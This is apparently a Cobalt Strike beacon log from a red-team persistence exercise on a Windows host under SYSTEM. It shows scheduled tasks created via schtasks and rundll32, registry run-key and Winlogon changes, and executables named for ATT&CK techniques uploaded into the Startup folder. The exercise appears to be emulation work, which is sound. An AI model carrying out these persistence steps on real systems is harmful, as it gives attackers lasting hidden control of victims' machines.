02/25 14:40:32 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 6088; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/25 14:40:38 [task] 计划任务运行rundll32
02/25 14:41:26 [checkin] host called home, sent: 123 bytes
02/25 14:41:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 任务名 spawn 已经存在。
要替换它吗(Y/N)?

02/25 14:42:30 [input] <neo> shell y
02/25 14:42:30 [task] Tasked beacon to run: y
02/25 14:43:26 [checkin] host called home, sent: 32 bytes
02/25 14:43:26 [output]
received output:
'y' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/25 14:47:38 [task] 计划任务运行rundll32
02/25 14:47:48 [task] 新增计划任务schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System 
02/25 14:48:26 [checkin] host called home, sent: 343 bytes
02/25 14:48:26 [output]
received output:
错误: 无效参数/选项 - '/ru'。
键入 "SCHTASKS /DELETE /?" 以了解用法。


02/25 14:48:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 任务名 spawn 已经存在。
要替换它吗(Y/N)?

02/25 14:48:26 [output]
received output:
错误: 无效参数/选项 - '/ru'。
键入 "SCHTASKS /DELETE /?" 以了解用法。


02/25 14:48:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 任务名 test 已经存在。
要替换它吗(Y/N)?

02/25 14:49:12 [task] 计划任务运行rundll32
02/25 14:49:20 [task] 新增计划任务
02/25 14:49:26 [checkin] host called home, sent: 320 bytes
02/25 14:49:26 [output]
received output:
警告: 确实要删除任务 "spawn" 吗 (Y/N )? 错误: 句柄无效。


02/25 14:49:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 任务名 spawn 已经存在。
要替换它吗(Y/N)?

02/25 14:49:26 [output]
received output:
警告: 确实要删除任务 "test" 吗 (Y/N )? 错误: 句柄无效。


02/25 14:49:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 任务名 test 已经存在。
要替换它吗(Y/N)?

02/25 14:51:03 [task] 计划任务运行rundll32
02/25 14:51:09 [task] 新增计划任务
02/25 14:51:26 [checkin] host called home, sent: 331 bytes
02/25 14:51:26 [output]
received output:
成功: 计划的任务 "spawn" 被成功删除。


02/25 14:51:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 14:51:26 [output]
received output:
成功: 计划的任务 "test" 被成功删除。


02/25 14:51:26 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "test"。


02/25 14:58:15 [task] 新增计划任务
02/25 14:58:27 [checkin] host called home, sent: 158 bytes
02/25 14:58:27 [output]
received output:
成功: 计划的任务 "test" 被成功删除。


02/25 14:58:27 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "test"。


02/25 15:04:10 [task] 计划任务运行rundll32
02/25 15:04:27 [checkin] host called home, sent: 173 bytes
02/25 15:04:28 [output]
received output:
成功: 计划的任务 "spawn" 被成功删除。


02/25 15:04:28 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 15:11:21 [task] 计划任务运行rundll32
02/25 15:11:28 [checkin] host called home, sent: 173 bytes
02/25 15:11:28 [output]
received output:
成功: 计划的任务 "spawn" 被成功删除。


02/25 15:11:28 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 15:29:36 [task] 计划任务运行rundll32
02/25 15:30:28 [checkin] host called home, sent: 173 bytes
02/25 15:30:29 [output]
received output:
错误: 系统找不到指定的文件。


02/25 15:30:29 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 15:33:51 [task] 计划任务运行rundll32
02/25 15:34:29 [checkin] host called home, sent: 173 bytes
02/25 15:34:29 [output]
received output:
错误: 系统找不到指定的文件。


02/25 15:34:29 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 15:44:42 [task] 计划任务运行rundll32
02/25 15:45:29 [checkin] host called home, sent: 162 bytes
02/25 15:45:30 [output]
received output:
成功: 计划的任务 "spawn" 被成功删除。


02/25 15:45:30 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
错误: 帐户名与安全标识间无任何映射完成。
(40,4):LogonType:

02/25 15:46:06 [task] 计划任务运行rundll32
02/25 15:46:30 [checkin] host called home, sent: 170 bytes
02/25 15:46:30 [output]
received output:
错误: 系统找不到指定的文件。


02/25 15:46:30 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 15:51:39 [task] 新增计划任务
02/25 15:52:23 [task] 计划任务运行rundll32
02/25 15:52:30 [checkin] host called home, sent: 299 bytes
02/25 15:52:31 [error] could not spawn : 87
02/25 15:52:31 [output]
received output:
成功: 计划的任务 "test" 被成功删除。


02/25 15:52:31 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "test"。


02/25 15:52:31 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 15:57:06 [task] 计划任务运行rundll32
02/25 15:57:31 [checkin] host called home, sent: 174 bytes
02/25 15:57:32 [output]
received output:
成功: 计划的任务 "spawn" 被成功删除。


02/25 15:57:32 [output]
received output:
错误: 无效参数/选项 - 'advpack.dll,'。
键入 "SCHTASKS /CREATE /?" 以了解用法。


02/25 15:59:06 [task] 计划任务运行rundll32
02/25 15:59:32 [checkin] host called home, sent: 181 bytes
02/25 15:59:32 [output]
received output:
错误: 系统找不到指定的文件。


02/25 15:59:32 [output]
received output:
错误: 无效语法。'/sc' 选项不允许超过 '1' 次。
键入 "SCHTASKS /CREATE /?" 以了解用法。


02/25 15:59:57 [task] 计划任务运行rundll32
02/25 16:00:32 [checkin] host called home, sent: 172 bytes
02/25 16:00:32 [output]
received output:
错误: 系统找不到指定的文件。


02/25 16:00:32 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 16:03:27 [task] 计划任务运行rundll32
02/25 16:03:32 [checkin] host called home, sent: 172 bytes
02/25 16:03:33 [output]
received output:
错误: 系统找不到指定的文件。


02/25 16:03:33 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 16:03:52 [task] 计划任务运行rundll32
02/25 16:04:33 [checkin] host called home, sent: 172 bytes
02/25 16:04:33 [output]
received output:
成功: 计划的任务 "spawn" 被成功删除。


02/25 16:04:33 [output]
received output:
警告: 因为 /ST 早于当前的时间，任务可能无法运行。
成功: 成功创建计划任务 "spawn"。


02/25 16:21:13 [task] 通过reg命令设置注册表项
02/25 16:21:13 [task] Tasked beacon to make directory c:\RedTeam\
02/25 16:21:13 [task] cd c:\RedTeam\
02/25 16:21:13 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\t1060_001.exe as t1060_001.exe
02/25 16:21:13 [indicator] file: 39c258e67b0132162b1976d0543e81b8 7680 bytes t1060_001.exe
02/25 16:21:13 [task] Tasked beacon to run: C:\RedTeam\t1060_001.exe
02/25 16:21:34 [checkin] host called home, sent: 7798 bytes
02/25 16:55:28 [task] 这里请放任意一个不带签名的文件到 c:\Users\SYSTEM *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/25 16:55:28 [task] cd c:\Users\SYSTEM *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/25 16:55:28 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1060.exe as T1060.exe
02/25 16:55:28 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes T1060.exe
02/25 16:55:35 [checkin] host called home, sent: 169580 bytes
02/25 17:16:13 [task] 设置Winlogon 加载项
02/25 17:16:13 [task] Tasked beacon to make directory c:\RedTeam\
02/25 17:16:13 [task] cd c:\RedTeam\
02/25 17:16:13 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1004.exe as T1004.exe
02/25 17:16:13 [indicator] file: 390249d04d25cf9ae63fe8b6ed086593 7680 bytes T1004.exe
02/25 17:16:13 [task] Tasked beacon to run: C:\RedTeam\T1004.exe
02/25 17:16:35 [checkin] host called home, sent: 7790 bytes
